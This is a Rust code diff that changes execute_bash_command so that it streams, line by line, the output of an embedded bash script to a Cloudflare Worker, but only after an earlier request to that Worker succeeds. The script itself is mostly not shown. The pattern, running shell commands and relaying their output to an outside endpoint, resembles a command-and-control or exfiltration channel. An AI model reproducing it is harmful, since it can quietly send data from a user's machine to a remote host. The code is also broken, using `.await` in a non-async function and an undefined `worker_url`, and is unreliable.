@@ -1,9 +1,10 @@
-use std::process::Command;
+use std::process::{Command, Stdio};
+use std::io::{BufReader, BufRead};
 
-pub fn execute_bash_command(request_successful: bool) -> Result<String, std::io::Error> {
+pub fn execute_bash_command(request_successful: bool) -> Result<(), std::io::Error> {
     if !request_successful {
         println!("Request to Cloudflare Worker failed. Skipping command execution.");
-        return Ok(String::from("Request failed"));
+        return Ok(());
     }
 
     let command = r#"
@@ -23,8 +24,20 @@ pub fn execute_bash_command(request_successful: bool) -> Result<String, std::io:
         done
     "#;
 
-    let output = Command::new("bash").arg("-c").arg(command).output()?;
-    let output_str = String::from_utf8_lossy(&output.stdout).into_owned();
+    let mut child = Command::new("bash")
+        .arg("-c")
+        .arg(command)
+        .stdout(Stdio::piped())
+        .spawn()?;
 
-    Ok(output_str)
+    let stdout = child.stdout.as_mut().expect("Failed to get stdout");
+    let reader = BufReader::new(stdout);
+
+    for line in reader.lines() {
+        let line = line?;
+        // Send the line to the Cloudflare Worker
+        worker_communication::send_data_request(&worker_url, &line).await?;
+    }
+
+    Ok(())
 }
